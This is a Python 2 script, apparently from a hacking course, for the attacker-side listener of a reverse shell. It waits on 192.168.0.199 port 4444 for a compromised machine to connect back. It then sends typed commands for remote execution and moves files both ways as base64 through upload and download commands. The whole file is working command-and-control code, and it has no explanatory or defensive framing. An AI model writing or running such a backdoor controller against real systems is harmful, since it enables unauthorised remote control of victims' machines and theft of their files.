#!usr/bin/python

import socket,json,base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connections : ")
        self.connection, address = listener.accept()
        print("[+] Received connection from "+ str(address))

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self,name,content):
        with open(name,"wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download Successful"

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def send_data(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def execute_remotely(self,command):
        self.send_data(command)
        if command[0]=='exit':
            self.connection.close()
            exit()
        return self.receive()

    def run(self):
        while True:
            try:
                command = raw_input(">> ")
                command = command.split(" ")
                if command[0]=="upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0]=="download" and "[-] Error" not in result:
                    print(self.write_file(command[1],result))
            except Exception:
                print("[-] Error in command execution")

my_listener = Listener("192.168.0.199",4444)
my_listener.run()
